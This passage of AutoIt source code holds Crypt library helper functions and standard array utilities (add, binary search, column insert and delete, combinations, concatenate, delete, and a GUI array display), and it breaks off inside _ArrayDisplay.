EndFunc

Func __crypt_refcount()
	Return $__g_acryptinternaldata[0]
EndFunc

Func __crypt_refcountinc()
	$__g_acryptinternaldata[0] += 1
EndFunc

Func __crypt_refcountdec()
	If $__g_acryptinternaldata[0] > 0 Then $__g_acryptinternaldata[0] -= 1
EndFunc

Func __crypt_dllhandle()
	Return $__g_acryptinternaldata[1]
EndFunc

Func __crypt_dllhandleset($hadvapi32)
	$__g_acryptinternaldata[1] = $hadvapi32
EndFunc

Func __crypt_context()
	Return $__g_acryptinternaldata[2]
EndFunc

Func __crypt_contextset($hcryptcontext)
	$__g_acryptinternaldata[2] = $hcryptcontext
EndFunc

Func __crypt_getcalgfromcryptkey($vcryptkey)
	Local $talgid = DllStructCreate("uint;dword")
	DllStructSetData($talgid, 2, 4)
	Local $aret = DllCall(__crypt_dllhandle(), "bool", "CryptGetKeyParam", "handle", $vcryptkey, "dword", $kp_algid, "ptr", DllStructGetPtr($talgid, 1), "dword*", DllStructGetPtr($talgid, 2), "dword", 0)
	If @error OR NOT $aret[0] Then
		Return SetError(@error, @extended, $crypt_userdata)
	Else
		Return DllStructGetData($talgid, 1)
	EndIf
EndFunc

Global Enum $arrayfill_force_default, $arrayfill_force_singleitem, $arrayfill_force_int, $arrayfill_force_number, $arrayfill_force_ptr, $arrayfill_force_hwnd, $arrayfill_force_string
Global Enum $arrayunique_nocount, $arrayunique_count
Global Enum $arrayunique_auto, $arrayunique_force32, $arrayunique_force64, $arrayunique_match, $arrayunique_distinct

Func _arrayadd(ByRef $aarray, $vvalue, $istart = 0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
	If $istart = Default Then $istart = 0
	If $sdelim_item = Default Then $sdelim_item = "|"
	If $sdelim_row = Default Then $sdelim_row = @CRLF
	If $iforce = Default Then $iforce = $arrayfill_force_default
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	Local $hdatatype = 0
	Switch $iforce
		Case $arrayfill_force_int
			$hdatatype = Int
		Case $arrayfill_force_number
			$hdatatype = Number
		Case $arrayfill_force_ptr
			$hdatatype = Ptr
		Case $arrayfill_force_hwnd
			$hdatatype = HWnd
		Case $arrayfill_force_string
			$hdatatype = String
	EndSwitch
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $iforce = $arrayfill_force_singleitem Then
				ReDim $aarray[$idim_1 + 1]
				$aarray[$idim_1] = $vvalue
				Return $idim_1
			EndIf
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 1 Then Return SetError(5, 0, -1)
				$hdatatype = 0
			Else
				Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
				If UBound($atmp, $ubound_rows) = 1 Then
					$atmp[0] = $vvalue
				EndIf
				$vvalue = $atmp
			EndIf
			Local $iadd = UBound($vvalue, $ubound_rows)
			ReDim $aarray[$idim_1 + $iadd]
			For $i = 0 To $iadd - 1
				If IsFunc($hdatatype) Then
					$aarray[$idim_1 + $i] = $hdatatype($vvalue[$i])
				Else
					$aarray[$idim_1 + $i] = $vvalue[$i]
				EndIf
			Next
			Return $idim_1 + $iadd - 1
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $istart < 0 OR $istart > $idim_2 - 1 Then Return SetError(4, 0, -1)
			Local $ivaldim_1, $ivaldim_2 = 0, $icolcount
			If IsArray($vvalue) Then
				If UBound($vvalue, $ubound_dimensions) <> 2 Then Return SetError(5, 0, -1)
				$ivaldim_1 = UBound($vvalue, $ubound_rows)
				$ivaldim_2 = UBound($vvalue, $ubound_columns)
				$hdatatype = 0
			Else
				Local $asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
				$ivaldim_1 = UBound($asplit_1, $ubound_rows)
				Local $atmp[$ivaldim_1][0], $asplit_2
				For $i = 0 To $ivaldim_1 - 1
					$asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
					$icolcount = UBound($asplit_2)
					If $icolcount > $ivaldim_2 Then
						$ivaldim_2 = $icolcount
						ReDim $atmp[$ivaldim_1][$ivaldim_2]
					EndIf
					For $j = 0 To $icolcount - 1
						$atmp[$i][$j] = $asplit_2[$j]
					Next
				Next
				$vvalue = $atmp
			EndIf
			If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(3, 0, -1)
			ReDim $aarray[$idim_1 + $ivaldim_1][$idim_2]
			For $iwriteto_index = 0 To $ivaldim_1 - 1
				For $j = 0 To $idim_2 - 1
					If $j < $istart Then
						$aarray[$iwriteto_index + $idim_1][$j] = ""
					ElseIf $j - $istart > $ivaldim_2 - 1 Then
						$aarray[$iwriteto_index + $idim_1][$j] = ""
					Else
						If IsFunc($hdatatype) Then
							$aarray[$iwriteto_index + $idim_1][$j] = $hdatatype($vvalue[$iwriteto_index][$j - $istart])
						Else
							$aarray[$iwriteto_index + $idim_1][$j] = $vvalue[$iwriteto_index][$j - $istart]
						EndIf
					EndIf
				Next
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aarray, $ubound_rows) - 1
EndFunc

Func _arraybinarysearch(Const ByRef $aarray, $vvalue, $istart = 0, $iend = 0, $icolumn = 0)
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $icolumn = Default Then $icolumn = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	If $idim_1 = 0 Then Return SetError(6, 0, -1)
	If $iend < 1 OR $iend > $idim_1 - 1 Then $iend = $idim_1 - 1
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(4, 0, -1)
	Local $imid = Int(($iend + $istart) / 2)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $aarray[$istart] > $vvalue OR $aarray[$iend] < $vvalue Then Return SetError(2, 0, -1)
			While $istart <= $imid AND $vvalue <> $aarray[$imid]
				If $vvalue < $aarray[$imid] Then
					$iend = $imid - 1
				Else
					$istart = $imid + 1
				EndIf
				$imid = Int(($iend + $istart) / 2)
			WEnd
			If $istart > $iend Then Return SetError(3, 0, -1)
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $icolumn < 0 OR $icolumn > $idim_2 Then Return SetError(7, 0, -1)
			If $aarray[$istart][$icolumn] > $vvalue OR $aarray[$iend][$icolumn] < $vvalue Then Return SetError(2, 0, -1)
			While $istart <= $imid AND $vvalue <> $aarray[$imid][$icolumn]
				If $vvalue < $aarray[$imid][$icolumn] Then
					$iend = $imid - 1
				Else
					$istart = $imid + 1
				EndIf
				$imid = Int(($iend + $istart) / 2)
			WEnd
			If $istart > $iend Then Return SetError(3, 0, -1)
		Case Else
			Return SetError(5, 0, -1)
	EndSwitch
	Return $imid
EndFunc

Func _arraycoldelete(ByRef $aarray, $icolumn, $bconvert = False)
	If $bconvert = Default Then $bconvert = False
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	If UBound($aarray, $ubound_dimensions) <> 2 Then Return SetError(2, 0, -1)
	Local $idim_2 = UBound($aarray, $ubound_columns)
	Switch $idim_2
		Case 2
			If $icolumn < 0 OR $icolumn > 1 Then Return SetError(3, 0, -1)
			If $bconvert Then
				Local $atemparray[$idim_1]
				For $i = 0 To $idim_1 - 1
					$atemparray[$i] = $aarray[$i][(NOT $icolumn)]
				Next
				$aarray = $atemparray
			Else
				ContinueCase
			EndIf
		Case Else
			If $icolumn < 0 OR $icolumn > $idim_2 - 1 Then Return SetError(3, 0, -1)
			For $i = 0 To $idim_1 - 1
				For $j = $icolumn To $idim_2 - 2
					$aarray[$i][$j] = $aarray[$i][$j + 1]
				Next
			Next
			ReDim $aarray[$idim_1][$idim_2 - 1]
	EndSwitch
	Return UBound($aarray, $ubound_columns)
EndFunc

Func _arraycolinsert(ByRef $aarray, $icolumn)
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			Local $atemparray[$idim_1][2]
			Switch $icolumn
				Case 0, 1
					For $i = 0 To $idim_1 - 1
						$atemparray[$i][(NOT $icolumn)] = $aarray[$i]
					Next
				Case Else
					Return SetError(3, 0, -1)
			EndSwitch
			$aarray = $atemparray
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns)
			If $icolumn < 0 OR $icolumn > $idim_2 Then Return SetError(3, 0, -1)
			ReDim $aarray[$idim_1][$idim_2 + 1]
			For $i = 0 To $idim_1 - 1
				For $j = $idim_2 To $icolumn + 1 Step -1
					$aarray[$i][$j] = $aarray[$i][$j - 1]
				Next
				$aarray[$i][$icolumn] = ""
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aarray, $ubound_columns)
EndFunc

Func _arraycombinations(Const ByRef $aarray, $iset, $sdelimiter = "")
	If $sdelimiter = Default Then $sdelimiter = ""
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If UBound($aarray, $ubound_dimensions) <> 1 Then Return SetError(2, 0, 0)
	Local $in = UBound($aarray)
	Local $ir = $iset
	Local $aidx[$ir]
	For $i = 0 To $ir - 1
		$aidx[$i] = $i
	Next
	Local $itotal = __array_combinations($in, $ir)
	Local $ileft = $itotal
	Local $aresult[$itotal + 1]
	$aresult[0] = $itotal
	Local $icount = 1
	While $ileft > 0
		__array_getnext($in, $ir, $ileft, $itotal, $aidx)
		For $i = 0 To $iset - 1
			$aresult[$icount] &= $aarray[$aidx[$i]] & $sdelimiter
		Next
		If $sdelimiter <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], 1)
		$icount += 1
	WEnd
	Return $aresult
EndFunc

Func _arrayconcatenate(ByRef $aarraytarget, Const ByRef $aarraysource, $istart = 0)
	If $istart = Default Then $istart = 0
	If NOT IsArray($aarraytarget) Then Return SetError(1, 0, -1)
	If NOT IsArray($aarraysource) Then Return SetError(2, 0, -1)
	Local $idim_total_tgt = UBound($aarraytarget, $ubound_dimensions)
	Local $idim_total_src = UBound($aarraysource, $ubound_dimensions)
	Local $idim_1_tgt = UBound($aarraytarget, $ubound_rows)
	Local $idim_1_src = UBound($aarraysource, $ubound_rows)
	If $istart < 0 OR $istart > $idim_1_src - 1 Then Return SetError(6, 0, -1)
	Switch $idim_total_tgt
		Case 1
			If $idim_total_src <> 1 Then Return SetError(4, 0, -1)
			ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $istart]
			For $i = $istart To $idim_1_src - 1
				$aarraytarget[$idim_1_tgt + $i - $istart] = $aarraysource[$i]
			Next
		Case 2
			If $idim_total_src <> 2 Then Return SetError(4, 0, -1)
			Local $idim_2_tgt = UBound($aarraytarget, $ubound_columns)
			If UBound($aarraysource, $ubound_columns) <> $idim_2_tgt Then Return SetError(5, 0, -1)
			ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $istart][$idim_2_tgt]
			For $i = $istart To $idim_1_src - 1
				For $j = 0 To $idim_2_tgt - 1
					$aarraytarget[$idim_1_tgt + $i - $istart][$j] = $aarraysource[$i][$j]
				Next
			Next
		Case Else
			Return SetError(3, 0, -1)
	EndSwitch
	Return UBound($aarraytarget, $ubound_rows)
EndFunc

Func _arraydelete(ByRef $aarray, $vrange)
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If IsArray($vrange) Then
		If UBound($vrange, $ubound_dimensions) <> 1 OR UBound($vrange, $ubound_rows) < 2 Then Return SetError(4, 0, -1)
	Else
		Local $inumber, $asplit_1, $asplit_2
		$vrange = StringStripWS($vrange, 8)
		$asplit_1 = StringSplit($vrange, ";")
		$vrange = ""
		For $i = 1 To $asplit_1[0]
			If NOT StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(3, 0, -1)
			$asplit_2 = StringSplit($asplit_1[$i], "-")
			Switch $asplit_2[0]
				Case 1
					$vrange &= $asplit_2[1] & ";"
				Case 2
					If Number($asplit_2[2]) >= Number($asplit_2[1]) Then
						$inumber = $asplit_2[1] - 1
						Do
							$inumber += 1
							$vrange &= $inumber & ";"
						Until $inumber = $asplit_2[2]
					EndIf
			EndSwitch
		Next
		$vrange = StringSplit(StringTrimRight($vrange, 1), ";")
	EndIf
	If $vrange[1] < 0 OR $vrange[$vrange[0]] > $idim_1 Then Return SetError(5, 0, -1)
	Local $icopyto_index = 0
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			For $i = 1 To $vrange[0]
				$aarray[$vrange[$i]] = ChrW(64177)
			Next
			For $ireadfrom_index = 0 To $idim_1
				If $aarray[$ireadfrom_index] == ChrW(64177) Then
					ContinueLoop
				Else
					If $ireadfrom_index <> $icopyto_index Then
						$aarray[$icopyto_index] = $aarray[$ireadfrom_index]
					EndIf
					$icopyto_index += 1
				EndIf
			Next
			ReDim $aarray[$idim_1 - $vrange[0] + 1]
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			For $i = 1 To $vrange[0]
				$aarray[$vrange[$i]][0] = ChrW(64177)
			Next
			For $ireadfrom_index = 0 To $idim_1
				If $aarray[$ireadfrom_index][0] == ChrW(64177) Then
					ContinueLoop
				Else
					If $ireadfrom_index <> $icopyto_index Then
						For $j = 0 To $idim_2
							$aarray[$icopyto_index][$j] = $aarray[$ireadfrom_index][$j]
						Next
					EndIf
					$icopyto_index += 1
				EndIf
			Next
			ReDim $aarray[$idim_1 - $vrange[0] + 1][$idim_2 + 1]
		Case Else
			Return SetError(2, 0, False)
	EndSwitch
	Return UBound($aarray, $ubound_rows)
EndFunc

Func _arraydisplay(Const ByRef $aarray, $stitle = Default, $sarrayrange = Default, $iflags = Default, $vuser_separator = Default, $sheader = Default, $imax_colwidth = Default, $ialt_color = Default, $huser_function = Default)
	If $stitle = Default Then $stitle = "ArrayDisplay"
	If $sarrayrange = Default Then $sarrayrange = ""
	If $iflags = Default Then $iflags = 0
	If $vuser_separator = Default Then $vuser_separator = ""
	If $sheader = Default Then $sheader = ""
	If $imax_colwidth = Default Then $imax_colwidth = 350
	If $ialt_color = Default Then $ialt_color = 0
	If $huser_function = Default Then $huser_function = 0
	Local $itranspose = BitAND($iflags, 1)
	Local $icolalign = BitAND($iflags, 6)
	Local $iverbose = BitAND($iflags, 8)
	Local $ibuttonmargin = ((BitAND($iflags, 32)) ? (0) : ((BitAND($iflags, 16)) ? (20) : (40)))
	Local $inorow = BitAND($iflags, 64)
	Local $smsg = "", $iret = 1
	If IsArray($aarray) Then
		Local $idimension = UBound($aarray, $ubound_dimensions), $irowcount = UBound($aarray, $ubound_rows), $icolcount = UBound($aarray, $ubound_columns)
		If $idimension > 2 Then
			$smsg = "Larger than 2D array passed to function"
			$iret = 2
		EndIf
	Else
		$smsg = "No array variable passed to function"
	EndIf
	If $smsg Then
		If $iverbose AND MsgBox($mb_systemmodal + $mb_iconerror + $mb_yesno, "ArrayDisplay Error: " & $stitle, $smsg & @CRLF & @CRLF & "Exit the script?") = $idyes Then
			Exit
		Else
			Return SetError($iret, 0, "")
		EndIf
	EndIf
	Local $icw_colwidth = Number($vuser_separator)
	Local $sad_separator = ChrW(64177)
	Local $scurr_separator = Opt("GUIDataSeparatorChar", $sad_separator)
	If $vuser_separator = "" Then $vuser_separator = $scurr_separator
	Local $vtmp, $irowlimit = 65525, $icollimit = 250
	Local $idatarow = $irowcount
	Local $idatacol = $icolcount
	Local $iitem_start = 0, $iitem_end = $irowcount - 1, $isubitem_start = 0, $isubitem_end = (($idimension = 2) ? ($icolcount - 1) : (0))
	Local $brange_flag = False, $avrangesplit
	If $sarrayrange Then
		Local $aarray_range = StringRegExp($sarrayrange & "||", "(?U)(.*)\|", 3)
		If $aarray_range[0] Then
			$avrangesplit = StringSplit($aarray_range[0], ":")
			If @error Then
				$iitem_end = Number($avrangesplit[1])
			Else
				$iitem_start = Number($avrangesplit[1])
				$iitem_end = Number($avrangesplit[2])
			EndIf
		EndIf
		If $iitem_start > $iitem_end Then
			$vtmp = $iitem_start
			$iitem_start = $iitem_end
			$iitem_end = $vtmp
		EndIf
		If $iitem_start < 0 Then $iitem_start = 0
		If $iitem_end > $irowcount - 1 Then $iitem_end = $irowcount - 1
		If $iitem_start <> 0 OR $iitem_end <> $irowcount - 1 Then $brange_flag = True
		If $idimension = 2 AND $aarray_range[1] Then
			$avrangesplit = StringSplit($aarray_range[1], ":")
			If @error Then
				$isubitem_end = Number($avrangesplit[1])
			Else
				$isubitem_start = Number($avrangesplit[1])
				$isubitem_end = Number($avrangesplit[2])
			EndIf
			If $isubitem_start > $isubitem_end Then
				$vtmp = $isubitem_start
				$isubitem_start = $isubitem_end
				$isubitem_end = $vtmp
			EndIf
			If $isubitem_start < 0 Then $isubitem_start = 0
			If $isubitem_end > $icolcount - 1 Then $isubitem_end = $icolcount - 1
			If $isubitem_start <> 0 OR $isubitem_end <> $icolcount - 1 Then $brange_flag = True
		EndIf
	EndIf
	Local $sdisplaydata = "[" & $idatarow
	Local $btruncated = False
	If $itranspose Then
		If $iitem_end - $iitem_start > $icollimit Then
			$btruncated = True
			$iitem_end = $iitem_start + $icollimit - 1
		EndIf
	Else
		If $iitem_end - $iitem_start > $irowlimit Then
			$btruncated = True
			$iitem_end = $iitem_start + $irowlimit - 1
		EndIf
	EndIf
	If $btruncated Then
		$sdisplaydata &= "*]"
	Else
		$sdisplaydata &= "]"
	EndIf
	If $idimension = 2 Then
		$sdisplaydata &= " [" & $idatacol
		If $itranspose Then
			If $isubitem_end - $isubitem_start > $irowlimit Then
				$btruncated = True
				$isubitem_end = $isubitem_start + $irowlimit - 1
			EndIf
		Else
			If $isubitem_end - $isubitem_start > $icollimit Then
				$btruncated = True
				$isubitem_end = $isubitem_start + $icollimit - 1
			EndIf
		EndIf
		If $btruncated Then
			$sdisplaydata &= "*]"
		Else
			$sdisplaydata &= "]"
		EndIf
	EndIf
	Local $stipdata = ""
	If $btruncated Then $stipdata &= "Truncated"
	If $brange_flag Then
		If $stipdata Then $stipdata &= " - "
		$stipdata &= "Range set"
	EndIf
	If $itranspose Then
		If $stipdata Then $stipdata &= " - "
		$stipdata &= "Transposed"
	EndIf
	Local $asheader = StringSplit($sheader, $scurr_separator, $str_nocount)
	If UBound($asheader) = 0 Then Local $asheader[1] = [""]
	$sheader = "Row"
	Local $iindex = $isubitem_start
	If $itranspose Then
		For $j = $iitem_start To $iitem_end
			$sheader &= $sad_separator & "Col " & $j
		Next
	Else
		If $asheader[0] Then
			For $iindex = $isubitem_start To $isubitem_end
				If $iindex >= UBound($asheader) Then ExitLoop
				$sheader &= $sad_separator & $asheader[$iindex]
			Next
		EndIf
		For $j = $iindex To $isubitem_end
			$sheader &= $sad_separator & "Col " & $j
		Next
	EndIf
	If $inorow Then $sheader = StringTrimLeft($sheader, 4)
	If $iverbose AND ($iitem_end - $iitem_start + 1) * ($isubitem_end - $isubitem_start + 1) > 10000 Then
		SplashTextOn("ArrayDisplay", "Preparing display" & @CRLF & @CRLF & "Please be patient", 300, 100)
	EndIf
	Local $ibuffer = 4094
	If $itranspose Then
		$vtmp = $iitem_start
		$iitem_start = $isubitem_start
		$isubitem_start = $vtmp
		$vtmp = $iitem_end
		$iitem_end = $isubitem_end
		$isubitem_end = $vtmp
	EndIf
	Local $avarraytext[$iitem_end - $iitem_start + 1]
	For $i = $iitem_start To $iitem_end
		If NOT $inorow Then $avarraytext[$i - $iitem_start] = "[" & $i & "]"
		For $j = $isubitem_start To $isubitem_end
			If $idimension = 1 Then
				If $itranspose Then
					Switch VarGetType($aarray[$j])
						Case "Array"
							$vtmp = "{Array}"
						Case Else
							$vtmp = $aarray[$j]
					EndSwitch
				Else
					Switch VarGetType($aarray[$i])
						Case "Array"
							$vtmp = "{Array}"
						Case Else
							$vtmp = $aarray[$i]
					EndSwitch
				EndIf
			Else
				If $itranspose Then
					Switch VarGetType($aarray[$j][$i])
						Case "Array"
							$vtmp = "{Array}"
						Case Else
							$vtmp = $aarray[$j][$i]
					EndSwitch
				Else
					Switch VarGetType($aarray[$i][$j])
						Case "Array"
							$vtmp = "{Array}"
						Case Else
							$vtmp = $aarray[$i][$j]
					EndSwitch
				EndIf
			EndIf
			If StringLen($vtmp) > $ibuffer Then $vtmp = StringLeft($vtmp, $ibuffer)
			$avarraytext[$i - $iitem_start] &= $sad_separator & $vtmp
		Next
		If $inorow Then $avarraytext[$i - $iitem_start] = StringTrimLeft($avarraytext[$i - $iitem_start], 1)
	Next
	Local Const $_arrayconstant_gui_dockbottom = 64
	Local Const $_arrayconstant_gui_dockborders = 102
	Local Const $_arrayconstant_gui_dockheight = 512
	Local Const $_arrayconstant_gui_dockleft = 2
	Local Const $_arrayconstant_gui_dockright = 4
	Local Const $_arrayconstant_gui_dockhcenter = 8
	Local Const $_arrayconstant_gui_event_close = -3
	Local Const $_arrayconstant_gui_focus = 256
	Local Const $_arrayconstant_gui_bkcolor_lv_alternate = -33554432
	Local Const $_arrayconstant_ss_center = 1
	Local Const $_arrayconstant_ss_centerimage = 512
	Local Const $_arrayconstant_lvm_getitemcount = (4096 + 4)
	Local Const $_arrayconstant_lvm_getitemrect = (4096 + 14)
	Local Const $_arrayconstant_lvm_getcolumnwidth = (4096 + 29)
	Local Const $_arrayconstant_lvm_setcolumnwidth = (4096 + 30)
	Local Const $_arrayconstant_lvm_getitemstate = (4096 + 44)
	Local Const $_arrayconstant_lvm_getselectedcount = (4096 + 50)
	Local Const $_arrayconstant_lvm_setextendedlistviewstyle = (4096 + 54)
	Local Const $_arrayconstant_lvs_ex_gridlines = 1
	Local Const $_arrayconstant_lvis_selected = 2
	Local Const $_arrayconstant_lvs_showselalways = 8
	Local Const $_arrayconstant_lvs_ex_fullrowselect = 32
	Local Const $_arrayconstant_ws_ex_clientedge = 512
	Local Const $_arrayconstant_ws_maximizebox = 65536
	Local Const $_arrayconstant_ws_minimizebox = 131072
	Local Const $_arrayconstant_ws_sizebox = 262144
	Local Const $_arrayconstant_wm_setredraw = 11
	Local Const $_arrayconstant_lvscw_autosize = -1
	Local $icoordmode = Opt("GUICoordMode", 1)
	Local $iorgwidth = 210, $iheight = 200, $iminsize = 250
	Local $hgui = GUICreate($stitle, $iorgwidth, $iheight, Default, Default, BitOR($_arrayconstant_ws_sizebox, $_arrayconstant_ws_minimizebox, $_arrayconstant_ws_maximizebox))
	Local $aiguisize = WinGetClientSize($hgui)
	Local $ibuttonwidth_2 = $aiguisize[0] / 2
	Local $ibuttonwidth_3 = $aiguisize[0] / 3
	Local $idlistview = GUICtrlCreateListView($sheader, 0, 0, $aiguisize[0], $aiguisize[1] - $ibuttonmargin, $_arrayconstant_lvs_showselalways)
	GUICtrlSetBkColor($idlistview, $_arrayconstant_gui_bkcolor_lv_alternate)
	GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_gridlines, $_arrayconstant_lvs_ex_gridlines)
	GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_fullrowselect, $_arrayconstant_lvs_ex_fullrowselect)
	GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_ws_ex_clientedge, $_arrayconstant_ws_ex_clientedge)
	Local $idcopy_id = 9999, $idcopy_data = 99999, $iddata_label = 99999, $iduser_func = 99999, $idexit_script = 99999
	If $ibuttonmargin Then
		$idcopy_id = GUICtrlCreateButton("Copy Data && Hdr/Row", 0, $aiguisize[1] - $ibuttonmargin, $ibuttonwidth_2, 20)
		$idcopy_data = GUICtrlCreateButton("Copy Data Only", $ibuttonwidth_2, $aiguisize[1] - $ibuttonmargin, $ibuttonwidth_2, 20)
		If $ibuttonmargin = 40 Then
			Local $ibuttonwidth_var = $ibuttonwidth_2
			Local $ioffset = $ibuttonwidth_2
			If IsFunc($huser_function) Then
				$iduser_func = GUICtrlCreateButton("Run User Func", $ibuttonwidth_3, $aiguisize[1] - 20, $ibuttonwidth_3, 20)
				$ibuttonwidth_var = $ibuttonwidth_3
				$ioffset = $ibuttonwidth_3 * 2
			EndIf
			$idexit_script = GUICtrlCreateButton("Exit Script", $ioffset, $aiguisize[1] - 20, $ibuttonwidth_var, 20)
			$iddata_label = GUICtrlCreateLabel($sdisplaydata, 0, $aiguisize[1] - 20, $ibuttonwidth_var, 18, BitOR($_arrayconstant_ss_center, $_arrayconstant_ss_centerimage))
			Select 
				Case $btruncated OR $itranspose OR $brange_flag
					GUICtrlSetColor($iddata_label, 16711680)
					GUICtrlSetTip($iddata_label, $stipdata)
			EndSelect
		EndIf
	EndIf
	GUICtrlSetResizing($idlistview, $_arrayconstant_gui_dockborders)
	GUICtrlSetResizing($idcopy_id, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($idcopy_data, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($iddata_label, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($iduser_func, $_arrayconstant_gui_dockhcenter + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($idexit_script, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSendMsg($idlistview, $_arrayconstant_wm_setredraw, 0, 0)
	Local $iditem
	For $i = 0 To UBound($avarraytext) - 1
		$iditem = GUICtrlCreateListViewItem($avarraytext[$i], $idlistview)
		If $ialt_color Then
			GUICtrlSetBkColor($iditem, $ialt_color)
		EndIf
	Next
	If $icolalign Then
		Local Const $_arrayconstant_lvcf_fmt = 1
		Local Const $_arrayconstant_lvm_setcolumnw = (4096 + 96)
		Local $tcolumn = DllStructCreate("uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal")
		DllStructSetData($tcolumn, "Mask", $_arrayconstant_lvcf_fmt)
		DllStructSetData($tcolumn, "Fmt", $icolalign / 2)
		Local $pcolumn = DllStructGetPtr($tcolumn)
		For $i = 1 To $isubitem_end - $isubitem_start + 1
			GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnw, $i, $pcolumn)
		Next
	EndIf
	GUICtrlSendMsg($idlistview, $_arrayconstant_wm_setredraw, 1, 0)
	Local $iborder = 45
	If UBound($avarraytext) > 20 Then
		$iborder += 20
	EndIf
	Local $iwidth = $iborder, $icolwidth = 0, $aicolwidth[$isubitem_end - $isubitem_start + 2], $imin_colwidth = 55
	For $i = 0 To $isubitem_end - $isubitem_start + 1
		GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $_arrayconstant_lvscw_autosize)
		$icolwidth = GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getcolumnwidth, $i, 0)
		If $icolwidth < $imin_colwidth Then
			GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $imin_colwidth)
			$icolwidth = $imin_colwidth
		EndIf
		$iwidth += $icolwidth
		$aicolwidth[$i] = $icolwidth
	Next
	If $inorow Then $iwidth -= 55
	If $iwidth > @DesktopWidth - 100 Then
		$iwidth = $iborder
		For $i = 0 To $isubitem_end - $isubitem_start + 1
			If $aicolwidth[$i] > $imax_colwidth Then
				GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $imax_colwidth)
				$iwidth += $imax_colwidth
			Else
				$iwidth += $aicolwidth[$i]
			EndIf
		Next
	EndIf
	If $iwidth > @DesktopWidth - 100 Then
		$iwidth = @DesktopWidth - 100
	ElseIf $iwidth < $iminsize Then
		$iwidth = $iminsize
	EndIf
	Local $trect = DllStructCreate("struct; long Left;long Top;long Right;long Bottom; endstruct")
	DllCall("user32.dll", "struct*", "SendMessageW", "hwnd", GUICtrlGetHandle($idlistview), "uint", $_arrayconstant_lvm_getitemrect, "wparam", 0, "struct*", $trect)
	Local $aiwin_pos = WinGetPos($hgui)
	Local $ailv_pos = ControlGetPos($hgui, "", $idlistview)
	$iheight = ((UBound($avarraytext) + 2) * (DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top"))) + $aiwin_pos[3] - $ailv_pos[3]
	If $iheight > @DesktopHeight - 100 Then
		$iheight = @DesktopHeight - 100
	ElseIf $iheight < $iminsize Then
		$iheight = $iminsize
	EndIf
	If $iverbose Then SplashOff()
	GUISetState(@SW_HIDE, $hgui)
	WinMove($hgui, "", (@DesktopWidth - $iwidth) / 2, (@DesktopHeight - $iheight) / 2, $iwidth, $iheight)
	GUISetState(@SW_SHOW, $hgui)
	Local $ioneventmode = Opt("GUIOnEventMode", 0), $imsg
	While 1
		$imsg = GUIGetMsg()
		Switch $imsg
			Case $_arrayconstant_gui_event_close
				ExitLoop
			Case $idcopy_id, $idcopy_data
				Local $isel_count = GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getselectedcount, 0, 0)
				If $iverbose AND (NOT $isel_count) AND ($iitem_end - $iitem_start) * ($isubitem_end - $isubitem_start) > 10000 Then
					SplashTextOn("ArrayDisplay", "Copying data" & @CRLF & @CRLF & "Please be patient", 300, 100)
				EndIf
				Local $sclip = "", $sitem, $asplit
				For $i = 0 To $iitem_end - $iitem_start
					If $isel_count AND NOT (GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected)) Then
						ContinueLoop
					EndIf
